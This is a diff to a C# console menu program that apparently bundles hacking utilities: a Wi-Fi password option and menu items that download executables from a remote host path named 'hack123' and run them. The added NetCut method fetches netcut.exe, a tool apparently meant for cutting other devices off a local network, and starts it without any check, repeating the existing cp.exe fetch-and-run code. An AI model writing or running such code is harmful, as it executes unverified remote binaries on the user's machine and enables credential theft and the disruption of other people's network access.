@@ -6,7 +6,7 @@ class Program
 {
     static void Main(string[] args)
     {
-        string[] options = { "Get WiFi Password", "Download and Run c.bat", "Run CP Command", "Exit" };
+    string[] options = { "Wi-Fi Password", "c.bat (download & run)", "cp.exe (download & run)", "netcut.exe (download & run)", "Exit" };
         int selectedIndex = 0;
 
         Console.CursorVisible = false;
@@ -71,6 +71,10 @@ class Program
             RunCPCommand();
         }
         else if (index == 3)
+        {
+            NetCut();
+        }
+        else if (index == 4)
         {
             Console.WriteLine("Exiting...");
             Environment.Exit(0);
@@ -159,6 +163,26 @@ class Program
                 client.DownloadFile("http://cekkistorage.cekuj.net/hack123/cp.exe", "cp.exe");
                 Console.WriteLine("cp.exe downloaded successfully.");
                 Process.Start("cp.exe");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error: {ex.Message}");
+        }
+
+        Console.ReadKey();
+    }
+    
+    static void NetCut()
+    {
+        Console.WriteLine("Downloading and running netcut.exe...");
+        try
+        {
+            using (var client = new WebClient())
+            {
+                client.DownloadFile("http://cekkistorage.cekuj.net/hack123/netcut.exe", "netcut.exe");
+                Console.WriteLine("netcut.exe downloaded successfully.");
+                Process.Start("netcut.exe");
             }
         }
         catch (Exception ex)
